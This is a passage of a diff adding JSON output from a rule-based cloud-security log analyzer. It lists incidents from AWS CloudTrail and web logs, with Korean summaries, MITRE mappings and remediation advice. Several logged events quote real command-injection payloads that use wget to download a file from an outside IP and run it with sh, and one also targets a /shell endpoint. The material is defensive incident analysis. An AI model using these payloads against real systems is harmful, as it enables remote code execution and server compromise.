+      "status": "failure",
+      "disposition": "none",
+      "src_ip": "139.198.18.205",
+      "rules": [
+       "CT_ACCESS_DENIED_BURST"
+      ],
+      "actor": "arn:aws:iam::622676721278:user/web_admin",
+      "access_key": "ASIAZB6T********BJQA",
+      "errorCode": "Client.UnauthorizedOperation",
+      "params": "{\"disableApiTermination\": true, \"monitoring\": {\"enabled\": false}, \"tagSpecificationSet\": {\"items\": [{\"resourceType\": \"instance\", \"tags\": [{\"key\": \"my_i_key\", \"value\": \"my_i_val\"}]}]}, \"userData\": \"<sensitiveDataRemoved>\", \"instancesSet\": {\"items\": [{\"imageId\": \"ami-af79ebc0\", \"minCount\": 1, \"maxCount\": 10}]}, \"blockDeviceMapping\": {}, \"instanceType\": \"t2.2xlarge\"}",
+      "userAgent": "Boto3/1.7.42 Python/2.7.12 Linux/4.4.0-131-generic Botocore/1.10.42",
+      "awsRegion": "eu-central-1"
+     }
+    ],
+    "omitted_events": 201,
+    "context": {
+     "n_events": 413,
+     "top_actions": [
+      [
+       "ec2:RunInstances",
+       391
+      ],
+      [
+       "sts:GetCallerIdentity",
+       16
+      ],
+      [
+       "iam:ListAccessKeys",
+       2
+      ],
+      [
+       "iam:DeleteAccessKey",
+       1
+      ],
+      [
+       "sts:GetSessionToken",
+       1
+      ],
+      [
+       "ec2:DescribeAccountAttributes",
+       1
+      ],
+      [
+       "iam:GetUser",
+       1
+      ]
+     ],
+     "sources": {
+      "cloudtrail": 413
+     }
+    },
+    "id": "INC-003",
+    "repeats": 1,
+    "first_seen": "2018-08-20T09:16:12+00:00",
+    "last_seen": "2018-08-20T09:28:54+00:00",
+    "repeat_ids": [],
+    "verdict": "attack",
+    "verdict_by": "rules"
+   },
+   "checks": [],
+   "report": {
+    "summary": "외부 공격 시도로 보입니다. 08-20 09:16~09:28 UTC(한국 18:16~18:28), 출발지 139.198.18.205, 35.153.154.221: IAM 사용자·키·권한·DB 관리자 비밀번호 생성/변경 → 권한 없는 API를 연속 시도(권한 탐색). 보이는 시도 32건은 모두 막히거나 실패했습니다(올린 로그 범위 안에서).",
+    "severity": "high",
+    "confidence": "low",
+    "verdict": "attack",
+    "verdict_reason": "IAM 사용자·키·권한·DB 관리자 비밀번호 생성/변경, 권한 없는 API를 연속 시도(권한 탐색). 보이는 시도 32건은 모두 막히거나 실패했습니다. 공격 시도이지만 급하지 않을 수 있습니다.",
+    "attack_flow": [
+     {
+      "stage": "persistence",
+      "technique": "T1098",
+      "time": "2018-08-20T09:16:12+00:00",
+      "what": "35.153.154.221에서 IAM 사용자·키·권한을 만들거나 바꾸려 했습니다(iam:CreateUser, iam:CreateAccessKey, 성공 0건, 거부 2건). 다시 들어올 문을 만드는 단계일 수 있습니다.",
+      "evidence": [
+       "cloudtrail.json:345",
+       "cloudtrail.json:347"
+      ]
+     },
+     {
+      "stage": "discovery",
+      "technique": "T1580",
+      "time": "2018-08-20T09:16:16+00:00",
+      "what": "139.198.18.205에서 권한 없는 API를 짧은 시간에 231번 시도했습니다. 쓸 수 있는 권한을 떠보는 모습일 수 있습니다.",
+      "evidence": [
+       "cloudtrail.json:352",
+       "cloudtrail.json:353",
+       "cloudtrail.json:354",
+       "cloudtrail.json:355",
+       "cloudtrail.json:356",
+       "cloudtrail.json:358",
+       "cloudtrail.json:359",
+       "cloudtrail.json:360"
+      ]
+     }
+    ],
+    "root_causes": [],
+    "firewall_changes": [],
+    "unknowns": [
+     "규칙 기반 판정이라 공격 의도와 실제 피해 범위는 사람이 확인해야 합니다.",
+     "보이는 시도는 모두 실패·차단이지만, 로그가 없는 다른 경로로 성공했는지는 알 수 없습니다.",
+     "비슷한 이벤트 201건은 생략하고 대표 이벤트만 보았습니다."
+    ]
+   },
+   "meta": {
+    "mode": "rules",
+    "model": null,
+    "payload_chars": 27547,
+    "validation": {
+     "evidence_total": 10,
+     "evidence_invalid": 0,
+     "steps_without_evidence": 0,
+     "unknown_check_ids": [],
+     "ai_new_changes": [],
+     "passed": true
+    }
+   }
+  },
+  {
+   "incident": {
+    "start": "2018-08-20T13:31:22+00:00",
+    "end": "2018-08-20T13:31:22+00:00",
+    "severity": "high",
+    "score": 306,
+    "stages": [
+     "initial-access"
+    ],
+    "src_ips": [
+     "156.202.170.156"
+    ],
+    "instances": [],
+    "actors": [],
+    "sources": [
+     "weblog"
+    ],
+    "n_events": 1,
+    "n_known": 0,
+    "known_labels": [],
+    "findings": [
+     {
+      "rule": "WEBLOG_CMD_INJECTION",
+      "technique": "T1190",
+      "stage": "initial-access",
+      "title": "운영체제 명령 삽입 시도",
+      "severity": "high",
+      "detail": "1건(성공 0, 실패·거부 1)",
+      "key": "156.202.170.156",
+      "first": "2018-08-20T13:31:22+00:00",
+      "last": "2018-08-20T13:31:22+00:00",
+      "n_events": 1,
+      "evidence": [
+       "access.log:2512"
+      ]
+     },
+     {
+      "rule": "WEBLOG_SQLI",
+      "technique": "T1190",
+      "stage": "initial-access",
+      "title": "웹 요청에 SQL 인젝션 패턴",
+      "severity": "high",
+      "detail": "1건(성공 0, 실패·거부 1) · 성공 신호 없음: 2xx 응답이 없음",
+      "key": "156.202.170.156",
+      "first": "2018-08-20T13:31:22+00:00",
+      "last": "2018-08-20T13:31:22+00:00",
+      "n_events": 1,
+      "evidence": [
+       "access.log:2512"
+      ]
+     }
+    ],
+    "events": [
+     {
+      "ref": "access.log:2512",
+      "ts": "2018-08-20T13:31:22+00:00",
+      "source": "weblog",
+      "action": "GET /login.cgi?cli=aa%20aa%27;wget%20http://185.172.164.41/e%20-O%20-%3E%20/tmp/hk;sh%20/tmp/hk%27$",
+      "outcome": "failure",
+      "status": "failure",
+      "disposition": "none",
+      "src_ip": "156.202.170.156",
+      "rules": [
+       "WEBLOG_CMD_INJECTION",
+       "WEBLOG_SQLI"
+      ],
+      "ua": "Hakai/2.0",
+      "http_status": 400
+     }
+    ],
+    "omitted_events": 0,
+    "context": {
+     "n_events": 6,
+     "top_actions": [
+      [
+       "tcp/80 ACCEPT",
+       6
+      ]
+     ],
+     "sources": {
+      "vpcflow": 6
+     }
+    },
+    "id": "INC-004",
+    "repeats": 1,
+    "first_seen": "2018-08-20T13:31:22+00:00",
+    "last_seen": "2018-08-20T13:31:22+00:00",
+    "repeat_ids": [],
+    "verdict": "attack",
+    "verdict_by": "rules"
+   },
+   "checks": [
+    {
+     "id": "WEB_FIX_SQLI",
+     "target": "app",
+     "resource": "/login.cgi(cli)",
+     "severity": "medium",
+     "title": "SQL 인젝션 취약 코드 수정: /login.cgi(cli)",
+     "why": "/login.cgi(cli)의 파라미터를 매개변수화된 질의(prepared statement)로 바꾸고, DB 계정 권한을 최소화한다.",
+     "evidence": [
+      "access.log:2512"
+     ],
+     "current": null,
+     "proposed": null,
+     "cli": [],
+     "rollback": [],
+     "caution": "코드·계정·파일을 사람이 직접 고치는 일이라 적용 명령은 없다."
+    },
+    {
+     "id": "WEB_FIX_INPUT",
+     "target": "app",
+     "resource": "/login.cgi(cli)",
+     "severity": "medium",
+     "title": "입력값 검증·경로 제한 적용: /login.cgi(cli)",
+     "why": "/login.cgi(cli)에서 파일 경로·외부 URL·명령에 사용자 입력이 그대로 들어가지 않게 막고, 화이트리스트로 검증한다.",
+     "evidence": [
+      "access.log:2512"
+     ],
+     "current": null,
+     "proposed": null,
+     "cli": [],
+     "rollback": [],
+     "caution": "코드·계정·파일을 사람이 직접 고치는 일이라 적용 명령은 없다."
+    }
+   ],
+   "report": {
+    "summary": "외부 공격 시도로 보입니다. 08-20 13:31 UTC(한국 22:31), 출발지 156.202.170.156: 운영체제 명령 삽입 시도 → 웹 요청에 SQL 인젝션 패턴. 보이는 시도 1건은 모두 막히거나 실패했습니다(올린 로그 범위 안에서). 먼저 할 일: SQL 인젝션 취약 코드 수정: /login.cgi(cli)(아래 수정안).",
+    "severity": "high",
+    "confidence": "low",
+    "verdict": "attack",
+    "verdict_reason": "운영체제 명령 삽입 시도, 웹 요청에 SQL 인젝션 패턴. 보이는 시도 1건은 모두 막히거나 실패했습니다. 공격 시도이지만 급하지 않을 수 있습니다.",
+    "attack_flow": [
+     {
+      "stage": "initial-access",
+      "technique": "T1190",
+      "time": "2018-08-20T13:31:22+00:00",
+      "what": "156.202.170.156에서 요청 값에 운영체제 명령을 끼워 넣은 요청이 1건 있었습니다(성공 0건, 거부 1건). 성공했다면 서버에서 명령이 실행됐을 수 있습니다.",
+      "evidence": [
+       "access.log:2512"
+      ]
+     },
+     {
+      "stage": "initial-access",
+      "technique": "T1190",
+      "time": "2018-08-20T13:31:22+00:00",
+      "what": "156.202.170.156에서 보낸 웹 요청 1건에 SQL 인젝션 문자열이 있었습니다(정상 응답 0건, 오류·거부 1건). 응답 크기로 본 판단: 성공 신호 없음: 2xx 응답이 없음.",
+      "evidence": [
+       "access.log:2512"
+      ]
+     }
+    ],
+    "root_causes": [
+     {
+      "setting": "SQL 인젝션 취약 코드 수정: /login.cgi(cli)",
+      "why": "/login.cgi(cli)의 파라미터를 매개변수화된 질의(prepared statement)로 바꾸고, DB 계정 권한을 최소화한다.",
+      "evidence": [
+       "access.log:2512"
+      ]
+     },
+     {
+      "setting": "입력값 검증·경로 제한 적용: /login.cgi(cli)",
+      "why": "/login.cgi(cli)에서 파일 경로·외부 URL·명령에 사용자 입력이 그대로 들어가지 않게 막고, 화이트리스트로 검증한다.",
+      "evidence": [
+       "access.log:2512"
+      ]
+     }
+    ],
+    "firewall_changes": [
+     {
+      "check_id": "WEB_FIX_SQLI",
+      "target": "app",
+      "resource": "/login.cgi(cli)",
+      "change": "SQL 인젝션 취약 코드 수정: /login.cgi(cli)",
+      "priority": "soon"
+     },
+     {
+      "check_id": "WEB_FIX_INPUT",
+      "target": "app",
+      "resource": "/login.cgi(cli)",
+      "change": "입력값 검증·경로 제한 적용: /login.cgi(cli)",
+      "priority": "soon"
+     }
+    ],
+    "unknowns": [
+     "규칙 기반 판정이라 공격 의도와 실제 피해 범위는 사람이 확인해야 합니다.",
+     "보이는 시도는 모두 실패·차단이지만, 로그가 없는 다른 경로로 성공했는지는 알 수 없습니다."
+    ]
+   },
+   "meta": {
+    "mode": "rules",
+    "model": null,
+    "payload_chars": 2186,
+    "validation": {
+     "evidence_total": 4,
+     "evidence_invalid": 0,
+     "steps_without_evidence": 0,
+     "unknown_check_ids": [],
+     "ai_new_changes": [],
+     "passed": true
+    }
+   }
+  },
+  {
+   "incident": {
+    "start": "2018-08-20T09:46:51.920550+00:00",
+    "end": "2018-08-20T09:46:51.920550+00:00",
+    "severity": "high",
+    "score": 296,
+    "stages": [
+     "initial-access"
+    ],
+    "src_ips": [
+     "197.41.194.233"
+    ],
+    "instances": [],
+    "actors": [],
+    "sources": [
+     "alb"
+    ],
+    "n_events": 1,
+    "n_known": 0,
+    "known_labels": [],
+    "findings": [
+     {
+      "rule": "WEBLOG_CMD_INJECTION",
+      "technique": "T1190",
+      "stage": "initial-access",
+      "title": "운영체제 명령 삽입 시도",
+      "severity": "high",
+      "detail": "1건(성공 0, 실패·거부 1)",
+      "key": "197.41.194.233",
+      "first": "2018-08-20T09:46:51.920550+00:00",
+      "last": "2018-08-20T09:46:51.920550+00:00",
+      "n_events": 1,
+      "evidence": [
+       "alb.log:6"
+      ]
+     }
+    ],
+    "events": [
+     {
+      "ref": "alb.log:6",
+      "ts": "2018-08-20T09:46:51.920550+00:00",
+      "source": "alb",
+      "action": "GET /shell?cd+/tmp;cd+/var;wget+http://199.195.254.118/jaws+-O+lwodo;sh%+lwodo;rm+-rf+lwodo",
+      "outcome": "failure",
+      "status": "failure",
+      "disposition": "none",
+      "src_ip": "197.41.194.233",
+      "rules": [
+       "WEBLOG_CMD_INJECTION"
+      ],
+      "dst_port": 80,
+      "ua": "Gemini/2.0",
+      "http_status": 400,
+      "http_host": "frothlyweblb-578021346.us-west-1.elb.amazonaws.com"
+     }
+    ],
+    "omitted_events": 0,
+    "context": {
+     "n_events": 3,
+     "top_actions": [
+      [
+       "tcp/80 ACCEPT",
+       3
+      ]
+     ],
+     "sources": {
+      "vpcflow": 3
+     }
+    },
+    "id": "INC-005",
+    "repeats": 1,
+    "first_seen": "2018-08-20T09:46:51.920550+00:00",
+    "last_seen": "2018-08-20T09:46:51.920550+00:00",
+    "repeat_ids": [],
+    "verdict": "attack",
+    "verdict_by": "rules"
+   },
+   "checks": [
+    {
+     "id": "WEB_FIX_INPUT",
+     "target": "app",
+     "resource": "/shell(cd /tmp;cd /var;wget http://199.195.254.118/jaws -O lwodo;sh% lwodo;rm -rf lwodo)",
+     "severity": "medium",
+     "title": "입력값 검증·경로 제한 적용: /shell(cd /tmp;cd /var;wget http://199.195.254.118/jaws -O lwodo;sh% lwodo;rm -rf lwodo)",
+     "why": "/shell(cd /tmp;cd /var;wget http://199.195.254.118/jaws -O lwodo;sh% lwodo;rm -rf lwodo)에서 파일 경로·외부 URL·명령에 사용자 입력이 그대로 들어가지 않게 막고, 화이트리스트로 검증한다.",
+     "evidence": [
+      "alb.log:6"
+     ],
+     "current": null,
+     "proposed": null,
+     "cli": [],
+     "rollback": [],
+     "caution": "코드·계정·파일을 사람이 직접 고치는 일이라 적용 명령은 없다."
+    }
+   ],
+   "report": {
+    "summary": "외부 공격 시도로 보입니다. 08-20 09:46 UTC(한국 18:46), 출발지 197.41.194.233: 운영체제 명령 삽입 시도. 보이는 시도 1건은 모두 막히거나 실패했습니다(올린 로그 범위 안에서). 먼저 할 일: 입력값 검증·경로 제한 적용: /shell(cd /tmp;cd /var;wget http://199.195.254.118/jaws -O lwodo;sh% lwodo;rm -rf lwodo)(아래 수정안).",
+    "severity": "high",
+    "confidence": "low",
+    "verdict": "attack",
+    "verdict_reason": "운영체제 명령 삽입 시도. 보이는 시도 1건은 모두 막히거나 실패했습니다. 공격 시도이지만 급하지 않을 수 있습니다.",
+    "attack_flow": [
+     {
+      "stage": "initial-access",
+      "technique": "T1190",
+      "time": "2018-08-20T09:46:51.920550+00:00",
+      "what": "197.41.194.233에서 요청 값에 운영체제 명령을 끼워 넣은 요청이 1건 있었습니다(성공 0건, 거부 1건). 성공했다면 서버에서 명령이 실행됐을 수 있습니다.",
+      "evidence": [
+       "alb.log:6"
+      ]
+     }
+    ],
+    "root_causes": [
+     {
+      "setting": "입력값 검증·경로 제한 적용: /shell(cd /tmp;cd /var;wget http://199.195.254.118/jaws -O lwodo;sh% lwodo;rm -rf lwodo)",
+      "why": "/shell(cd /tmp;cd /var;wget http://199.195.254.118/jaws -O lwodo;sh% lwodo;rm -rf lwodo)에서 파일 경로·외부 URL·명령에 사용자 입력이 그대로 들어가지 않게 막고, 화이트리스트로 검증한다.",
+      "evidence": [
+       "alb.log:6"
+      ]
+     }
+    ],
+    "firewall_changes": [
+     {
+      "check_id": "WEB_FIX_INPUT",
+      "target": "app",
+      "resource": "/shell(cd /tmp;cd /var;wget http://199.195.254.118/jaws -O lwodo;sh% lwodo;rm -rf lwodo)",
+      "change": "입력값 검증·경로 제한 적용: /shell(cd /tmp;cd /var;wget http://199.195.254.118/jaws -O lwodo;sh% lwodo;rm -rf lwodo)",
+      "priority": "soon"
+     }
+    ],
+    "unknowns": [
+     "규칙 기반 판정이라 공격 의도와 실제 피해 범위는 사람이 확인해야 합니다.",
+     "보이는 시도는 모두 실패·차단이지만, 로그가 없는 다른 경로로 성공했는지는 알 수 없습니다."
+    ]
+   },
+   "meta": {
+    "mode": "rules",
+    "model": null,
+    "payload_chars": 1797,
+    "validation": {
+     "evidence_total": 2,
+     "evidence_invalid": 0,
+     "steps_without_evidence": 0,
+     "unknown_check_ids": [],
+     "ai_new_changes": [],
+     "passed": true
+    }
+   }
+  }
+ ],
+ "timing": {
+  "detect_correlate_s": 0.49,
+  "total_s": 0.55
+ },
+ "has_environment": false,
+ "team": {
+  "proposed": [
+   {
+    "actor": "arn:aws:iam::622676721278:user/splunk_access",
+    "name": "splunk_access",
+    "reasons": [
+     "콘솔 세션 임시 키 사용",
+     "로그 기간의 99% 동안 활동"
+    ],
+    "n_events": 4116,
+    "n_ips": 2,
+    "first": "2018-08-20T09:01:54+00:00",
+    "last": "2018-08-20T15:13:30+00:00"
+   },
+   {
+    "actor": "arn:aws:iam::622676721278:user/bstoll",
+    "name": "bstoll",
+    "reasons": [
+     "콘솔 로그인 4회",
+     "로그 기간의 90% 동안 활동"
+    ],
+    "n_events": 615,
+    "n_ips": 6,
+    "first": "2018-08-20T09:35:27+00:00",
+    "last": "2018-08-20T15:15:04+00:00"
+   }
+  ],
+  "confirmed": [],
+  "excluded": [
+   {
+    "actor": "arn:aws:iam::622676721278:user/web_admin",
+    "name": "web_admin",
+    "rules": [
+     "CT_ACCESS_DENIED_BURST"
+    ]
+   }
+  ]
+ },
+ "excluded_activity": [],
+ "quiet_admin": [],
+ "experimental": [],
+ "assumptions": [
+  "auth.log·kern.log처럼 연도·시간대가 없는 줄은 UTC 기준, 연도는 2018로 해석했습니다. 다르면 시간대·연도 옵션(명령줄은 --syslog-tz, --year)으로 지정하세요.",
+  "설정 스냅샷(environment.json)이 없어 방화벽 수정안을 만들지 않았습니다. python -m logsight collect environment로 만들 수 있습니다.",
+  "웹서버 로그 3,891줄은 내부 IP(사내 사용자이거나 ALB·프록시)에서 왔고 X-Forwarded-For에 실제 사용자 IP가 없어 내부 IP로 분석했습니다. ALB·프록시 뒤라면 nginx 로그 형식 끝에 \"$http_x_forwarded_for\"를 넣으면(nginx 기본 main 형식) 실제 IP로 분석합니다.",
+  "사내 IP 172.16.0.149는 여러 사용자가 함께 쓰는 주소로 보여 사건을 엮는 연결고리에서 뺐습니다(상태 확인 요청(ELB-HealthChecker/2.0)을 보냄: 로드밸런서·프록시 주소).",
+  "사내 IP 172.16.1.239는 여러 사용자가 함께 쓰는 주소로 보여 사건을 엮는 연결고리에서 뺐습니다(상태 확인 요청(ELB-HealthChecker/2.0)을 보냄: 로드밸런서·프록시 주소)."
+ ]
+}
